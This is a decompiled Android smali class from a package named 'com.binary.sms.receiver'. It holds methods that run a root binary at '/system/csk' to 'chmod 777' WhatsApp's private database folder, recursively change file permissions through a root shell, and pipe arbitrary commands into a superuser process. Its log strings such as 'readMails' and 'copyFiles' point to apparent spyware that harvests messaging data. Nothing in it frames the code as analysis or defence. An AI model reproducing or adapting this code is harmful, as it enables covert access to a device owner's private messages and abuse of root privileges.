.class Lcom/binary/sms/receiver/SkeletonActivity$7;
.super Ljava/lang/Object;
.source "SkeletonActivity.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/binary/sms/receiver/SkeletonActivity;->copyOneByOne(Ljava/lang/String;Ljava/lang/String;J)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/binary/sms/receiver/SkeletonActivity;

.field private final synthetic val$source:Ljava/lang/String;

.field private final synthetic val$suComand:Ljava/lang/String;


# direct methods
.method constructor <init>(Lcom/binary/sms/receiver/SkeletonActivity;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/binary/sms/receiver/SkeletonActivity$7;->this$0:Lcom/binary/sms/receiver/SkeletonActivity;

    iput-object p2, p0, Lcom/binary/sms/receiver/SkeletonActivity$7;->val$suComand:Ljava/lang/String;

    iput-object p3, p0, Lcom/binary/sms/receiver/SkeletonActivity$7;->val$source:Ljava/lang/String;

    .line 504
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public chmodFiles(Ljava/io/File;Ljava/lang/String;)V
    .locals 8
    .param p1, "f"    # Ljava/io/File;
    .param p2, "dest"    # Ljava/lang/String;

    .prologue
    const/4 v4, 0x0

    .line 546
    const/4 v5, 0x1

    :try_start_0
    new-array v1, v5, [Ljava/lang/String;

    const/4 v5, 0x0

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "chmod 777 "

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    aput-object v6, v1, v5

    .line 547
    .local v1, "commands":[Ljava/lang/String;
    iget-object v5, p0, Lcom/binary/sms/receiver/SkeletonActivity$7;->val$suComand:Ljava/lang/String;

    invoke-virtual {p0, v5, v1}, Lcom/binary/sms/receiver/SkeletonActivity$7;->sume(Ljava/lang/String;[Ljava/lang/String;)V

    .line 553
    invoke-virtual {p1}, Ljava/io/File;->isDirectory()Z

    move-result v5

    if-eqz v5, :cond_0

    .line 555
    invoke-virtual {p1}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v3

    .line 556
    .local v3, "files":[Ljava/io/File;
    if-eqz v3, :cond_0

    .line 558
    array-length v5, v3

    :goto_0
    if-lt v4, v5, :cond_1

    .line 571
    .end local v1    # "commands":[Ljava/lang/String;
    .end local v3    # "files":[Ljava/io/File;
    :cond_0
    :goto_1
    return-void

    .line 558
    .restart local v1    # "commands":[Ljava/lang/String;
    .restart local v3    # "files":[Ljava/io/File;
    :cond_1
    aget-object v0, v3, v4
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 560
    .local v0, "c":Ljava/io/File;
    :try_start_1
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {p2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v7, p0, Lcom/binary/sms/receiver/SkeletonActivity$7;->val$source:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {p0, v0, v6}, Lcom/binary/sms/receiver/SkeletonActivity$7;->chmodFiles(Ljava/io/File;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 558
    :goto_2
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    .line 561
    :catch_0
    move-exception v2

    .line 562
    .local v2, "e":Ljava/lang/Exception;
    :try_start_2
    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "copyFiles"

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6, v2}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_2

    .line 568
    .end local v0    # "c":Ljava/io/File;
    .end local v1    # "commands":[Ljava/lang/String;
    .end local v2    # "e":Ljava/lang/Exception;
    .end local v3    # "files":[Ljava/io/File;
    :catch_1
    move-exception v2

    .line 569
    .restart local v2    # "e":Ljava/lang/Exception;
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "copyFiles ext"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4, v2}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_1
.end method

.method public chmodOneCommand(Ljava/io/File;Ljava/lang/String;)V
    .locals 5
    .param p1, "f"    # Ljava/io/File;
    .param p2, "dest"    # Ljava/lang/String;

    .prologue
    .line 533
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v1

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "/system/csk"

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-string v4, "export LD_LIBRARY_PATH=/vendor/lib:/system/lib; chmod 777 /data/data/com.whatsapp/databases/"

    aput-object v4, v2, v3

    invoke-virtual {v1, v2}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 540
    :goto_0
    return-void

    .line 537
    :catch_0
    move-exception v0

    .line 538
    .local v0, "e":Ljava/lang/Exception;
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "chmodFilesArry ext"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public run()V
    .locals 5

    .prologue
    .line 508
    :try_start_0
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "copyOneByOne: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v3, p0, Lcom/binary/sms/receiver/SkeletonActivity$7;->val$suComand:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 509
    new-instance v1, Ljava/io/File;

    iget-object v2, p0, Lcom/binary/sms/receiver/SkeletonActivity$7;->val$source:Ljava/lang/String;

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 510
    .local v1, "f":Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-nez v2, :cond_0

    .line 512
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "file not exist: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 515
    :cond_0
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "/sdcard/"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-virtual {v2, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0, v1, v2}, Lcom/binary/sms/receiver/SkeletonActivity$7;->chmodOneCommand(Ljava/io/File;Ljava/lang/String;)V

    .line 522
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "copyOneByOne end: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v3, p0, Lcom/binary/sms/receiver/SkeletonActivity$7;->val$suComand:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 527
    .end local v1    # "f":Ljava/io/File;
    :goto_0
    return-void

    .line 523
    :catch_0
    move-exception v0

    .line 524
    .local v0, "e":Ljava/lang/Exception;
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "readMails: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v0}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public sume(Ljava/lang/String;[Ljava/lang/String;)V
    .locals 12
    .param p1, "suComand"    # Ljava/lang/String;
    .param p2, "commands"    # [Ljava/lang/String;

    .prologue
    const/4 v8, 0x0

    .line 578
    const/4 v3, 0x0

    .line 580
    .local v3, "msg":Landroid/os/Message;
    const/4 v1, 0x1

    .line 582
    .local v1, "i":I
    const/4 v6, 0x0

    .line 583
    .local v6, "process":Ljava/lang/Process;
    const/4 v4, 0x0

    .line 586
    .local v4, "os":Ljava/io/DataOutputStream;
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v9

    invoke-virtual {v9, p1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v6

    .line 590
    new-instance v5, Ljava/io/DataOutputStream;

    invoke-virtual {v6}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v9

    invoke-direct {v5, v9}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 595
    .end local v4    # "os":Ljava/io/DataOutputStream;
    .local v5, "os":Ljava/io/DataOutputStream;
    if-eqz p2, :cond_0

    .line 597
    :try_start_1
    array-length v9, p2

    move v2, v1

    .end local v1    # "i":I
    .local v2, "i":I
    :goto_0
    if-lt v8, v9, :cond_2

    move v1, v2

    .line 610
    .end local v2    # "i":I
    .restart local v1    # "i":I
    :cond_0
    const-string v8, "exit\n"

    invoke-virtual {v5, v8}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 611
    invoke-virtual {v5}, Ljava/io/DataOutputStream;->flush()V

    .line 613
    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;

    const-wide/16 v8, 0x1f4

    invoke-static {v8, v9}, Ljava/lang/Thread;->sleep(J)V

    .line 615
    invoke-virtual {v6}, Ljava/lang/Process;->waitFor()I

    .line 616
    invoke-static {}, Landroid/os/Message;->obtain()Landroid/os/Message;

    move-result-object v3

    .line 617
    const/4 v8, 0x0

    iput v8, v3, Landroid/os/Message;->arg1:I

    .line 618
    const/4 v8, 0x0

    iput v8, v3, Landroid/os/Message;->arg2:I

    .line 620
    const-string v8, "systemCall Succesfule"

    invoke-static {v8}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_4
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 632
    if-eqz v5, :cond_1

    .line 633
    :try_start_2
    invoke-virtual {v5}, Ljava/io/DataOutputStream;->close()V

    .line 635
    :cond_1
    invoke-virtual {v6}, Ljava/lang/Process;->destroy()V

    .line 637
    iget-object v8, p0, Lcom/binary/sms/receiver/SkeletonActivity$7;->this$0:Lcom/binary/sms/receiver/SkeletonActivity;

    invoke-static {v8}, Lcom/binary/sms/receiver/SkeletonActivity;->access$0(Lcom/binary/sms/receiver/SkeletonActivity;)Landroid/widget/EditText;

    move-result-object v8

    const/4 v9, 0x0

    aget-object v9, p2, v9

    invoke-virtual {v8, v9}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    :goto_1
    move-object v4, v5

    .line 645
    .end local v5    # "os":Ljava/io/DataOutputStream;
    .restart local v4    # "os":Ljava/io/DataOutputStream;
    :goto_2
    return-void

    .line 597
    .end local v1    # "i":I
    .end local v4    # "os":Ljava/io/DataOutputStream;
    .restart local v2    # "i":I
    .restart local v5    # "os":Ljava/io/DataOutputStream;
    :cond_2
    :try_start_3
    aget-object v7, p2, v8

    .line 598
    .local v7, "single":Ljava/lang/String;
    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "command: "

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v10, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 599
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-static {v7}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v11

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v11, "\n"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v5, v10}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 600
    invoke-virtual {v5}, Ljava/io/DataOutputStream;->flush()V

    .line 601
    invoke-static {}, Landroid/os/Message;->obtain()Landroid/os/Message;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_5
    .catchall {:try_start_3 .. :try_end_3} :catchall_2

    move-result-object v3

    .line 602
    add-int/lit8 v1, v2, 0x1

    .end local v2    # "i":I
    .restart local v1    # "i":I
    :try_start_4
    iput v2, v3, Landroid/os/Message;->arg1:I

    .line 603
    const/4 v10, -0x1

    iput v10, v3, Landroid/os/Message;->arg2:I
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    .line 597
    add-int/lit8 v8, v8, 0x1

    move v2, v1

    .end local v1    # "i":I
    .restart local v2    # "i":I
    goto :goto_0

    .line 622
    .end local v2    # "i":I
    .end local v5    # "os":Ljava/io/DataOutputStream;
    .end local v7    # "single":Ljava/lang/String;
    .restart local v1    # "i":I
    .restart local v4    # "os":Ljava/io/DataOutputStream;
    :catch_0
    move-exception v0

    .line 623
    .local v0, "e":Ljava/lang/Exception;
    :goto_3
    :try_start_5
    invoke-static {}, Landroid/os/Message;->obtain()Landroid/os/Message;

    move-result-object v3

    .line 624
    const/4 v8, 0x1

    iput v8, v3, Landroid/os/Message;->arg1:I

    .line 625
    const/4 v8, 0x0

    iput v8, v3, Landroid/os/Message;->arg2:I

    .line 627
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "systemCall Exception"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8, v0}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    .line 632
    if-eqz v4, :cond_3

    .line 633
    :try_start_6
    invoke-virtual {v4}, Ljava/io/DataOutputStream;->close()V

    .line 635
    :cond_3
    invoke-virtual {v6}, Ljava/lang/Process;->destroy()V

    .line 637
    iget-object v8, p0, Lcom/binary/sms/receiver/SkeletonActivity$7;->this$0:Lcom/binary/sms/receiver/SkeletonActivity;

    invoke-static {v8}, Lcom/binary/sms/receiver/SkeletonActivity;->access$0(Lcom/binary/sms/receiver/SkeletonActivity;)Landroid/widget/EditText;

    move-result-object v8

    const/4 v9, 0x0

    aget-object v9, p2, v9

    invoke-virtual {v8, v9}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    goto :goto_2

    .line 641
    :catch_1
    move-exception v0

    .line 642
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "systemCall finaly"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8, v0}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto/16 :goto_2

    .line 630
    .end local v0    # "e":Ljava/lang/Exception;
    :catchall_0
    move-exception v8

    .line 632
    :goto_4
    if-eqz v4, :cond_4

    .line 633
    :try_start_7
    invoke-virtual {v4}, Ljava/io/DataOutputStream;->close()V

    .line 635
    :cond_4
    invoke-virtual {v6}, Ljava/lang/Process;->destroy()V

    .line 637
    iget-object v9, p0, Lcom/binary/sms/receiver/SkeletonActivity$7;->this$0:Lcom/binary/sms/receiver/SkeletonActivity;

    invoke-static {v9}, Lcom/binary/sms/receiver/SkeletonActivity;->access$0(Lcom/binary/sms/receiver/SkeletonActivity;)Landroid/widget/EditText;

    move-result-object v9

    const/4 v10, 0x0

    aget-object v10, p2, v10

    invoke-virtual {v9, v10}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2

    .line 644
    :goto_5
    throw v8

    .line 641
    :catch_2
    move-exception v0

    .line 642
    .restart local v0    # "e":Ljava/lang/Exception;
    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "systemCall finaly"

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9, v0}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_5

    .line 641
    .end local v0    # "e":Ljava/lang/Exception;
    .end local v4    # "os":Ljava/io/DataOutputStream;
    .restart local v5    # "os":Ljava/io/DataOutputStream;
    :catch_3
    move-exception v0

    .line 642
    .restart local v0    # "e":Ljava/lang/Exception;
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "systemCall finaly"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8, v0}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto/16 :goto_1

    .line 630
    .end local v0    # "e":Ljava/lang/Exception;
    :catchall_1
    move-exception v8

    move-object v4, v5

    .end local v5    # "os":Ljava/io/DataOutputStream;
    .restart local v4    # "os":Ljava/io/DataOutputStream;
    goto :goto_4

    .end local v1    # "i":I
    .end local v4    # "os":Ljava/io/DataOutputStream;
    .restart local v2    # "i":I
    .restart local v5    # "os":Ljava/io/DataOutputStream;
    :catchall_2
    move-exception v8

    move-object v4, v5

    .end local v5    # "os":Ljava/io/DataOutputStream;
    .restart local v4    # "os":Ljava/io/DataOutputStream;
    move v1, v2

    .end local v2    # "i":I
    .restart local v1    # "i":I
    goto :goto_4

    .line 622
    .end local v4    # "os":Ljava/io/DataOutputStream;
    .restart local v5    # "os":Ljava/io/DataOutputStream;
    :catch_4
    move-exception v0

    move-object v4, v5

    .end local v5    # "os":Ljava/io/DataOutputStream;
    .restart local v4    # "os":Ljava/io/DataOutputStream;
    goto/16 :goto_3

    .end local v1    # "i":I
    .end local v4    # "os":Ljava/io/DataOutputStream;
    .restart local v2    # "i":I
    .restart local v5    # "os":Ljava/io/DataOutputStream;
    :catch_5
    move-exception v0

    move-object v4, v5

    .end local v5    # "os":Ljava/io/DataOutputStream;
    .restart local v4    # "os":Ljava/io/DataOutputStream;
    move v1, v2

    .end local v2    # "i":I
    .restart local v1    # "i":I
    goto/16 :goto_3
.end method
